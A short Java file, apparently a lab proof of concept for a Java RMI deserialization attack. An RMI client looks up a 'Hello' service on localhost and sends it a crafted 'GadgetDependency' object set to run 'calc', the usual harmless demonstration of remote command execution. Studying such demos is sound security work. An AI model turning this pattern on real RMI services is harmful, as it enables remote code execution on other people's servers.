package org.vul;

import org.vul.dependencies.GadgetDependency;
import org.vul.inter.IHello;

import java.rmi.registry.LocateRegistry;

public class RMIClient {
    public static void main(String[] args) throws Exception {
        IHello iHello = (IHello) LocateRegistry.getRegistry("127.0.0.1", 1099).lookup("Hello");
        GadgetDependency gadgetDependency = new GadgetDependency();
        gadgetDependency.setParam("calc");
        iHello.sayHello(gadgetDependency);
    }
}
